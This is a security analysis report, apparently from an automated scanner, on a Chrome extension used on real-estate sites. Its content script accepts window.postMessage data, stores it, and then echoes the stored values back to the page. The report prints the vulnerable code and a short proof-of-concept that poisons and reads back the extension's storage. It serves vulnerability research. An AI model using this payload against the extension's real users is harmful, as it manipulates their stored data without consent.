# CoCo Analysis: jmkacnnidbodfebleckcpdehmbmodkii

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jmkacnnidbodfebleckcpdehmbmodkii/opgen_generated_files/cs_0.js
Line 467: window.addEventListener("message", ...) → chrome.storage.local.set({mwfilters:o.data.payload})

**Note:** The code at line 467 is the actual extension code (after the 3rd "// original" marker at line 465).

**Code:**

```javascript
// Content script - Complete storage exploitation chain (line 467, beautified for readability)

// Entry point: window.postMessage listener ← attacker-controlled from ANY webpage
window.addEventListener("message", (o => {
  // ... other message handlers ...

  // VULNERABLE PATH: SYNC_FILTERS message
  o.data && "SYNC_FILTERS" === o.data.type &&
    chrome.storage.local.set({mwfilters: o.data.payload}); // ← Storage write with attacker data
}));

// CRITICAL: Storage change listener that sends data back to attacker
const o = ["clientId", "priceEnabled", "featureEnabled", "schoolsData",
           "schoolPositionData", "schoolAvgData", "selectedLanguage",
           "doNotShowOnCommercialPage", "mwfilters"]; // ← "mwfilters" is monitored

chrome.storage.onChanged.addListener(((e, t) => {
  for (const [t, {newValue: a}] of Object.entries(e))
    if (o.includes(t)) { // ← Checks if changed key is "mwfilters"
      const o = setInterval((() => {
        // RETRIEVAL PATH: Posts stored value back to webpage
        window.postMessage({
          type: "FROM_CONTENT_SCRIPT",
          payload: {key: t, value: a} // ← Attacker receives poisoned data
        }, "*");
      }), 500);
      n[t] && clearInterval(n[t]), n[t] = o
    }
}));

// Additional retrieval path: On page load, reads and posts all storage values
o.forEach((async o => {
  const e = await chrome.storage.local.get(o);
  if (void 0 !== e[o]) {
    const t = setInterval((() => {
      window.postMessage({
        type: "FROM_CONTENT_SCRIPT",
        payload: {key: o, value: e[o]} // ← Also sends stored values back
      }, "*");
    }), 500);
    n[o] && clearInterval(n[o]), n[o] = t
  }
}));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM-based)

**Attack:**

```javascript
// Attacker's malicious webpage (works on realtor.ca, housesigma.com, etc.)
// Step 1: Poison storage with attacker-controlled data
window.postMessage({
  type: "SYNC_FILTERS",
  payload: "ATTACKER_CONTROLLED_DATA_HERE"
}, "*");

// Step 2: Listen for retrieval (extension automatically sends data back)
window.addEventListener("message", (event) => {
  if (event.data.type === "FROM_CONTENT_SCRIPT" &&
      event.data.payload.key === "mwfilters") {
    console.log("Retrieved poisoned data:", event.data.payload.value);
    // Attacker successfully retrieved: "ATTACKER_CONTROLLED_DATA_HERE"
  }
});
```

**Impact:** Complete storage exploitation chain. Attacker can:
1. Write arbitrary data to chrome.storage.local via window.postMessage("SYNC_FILTERS")
2. Retrieve the poisoned data back via the storage.onChanged listener that automatically posts changes to window
3. Achieve information disclosure and storage manipulation on real estate websites (realtor.ca, housesigma.com, zealty.ca, property.ca)

The extension runs on real estate websites and allows attackers on these sites to manipulate extension storage and retrieve the poisoned values, potentially affecting how the extension displays school ratings and property information to users.
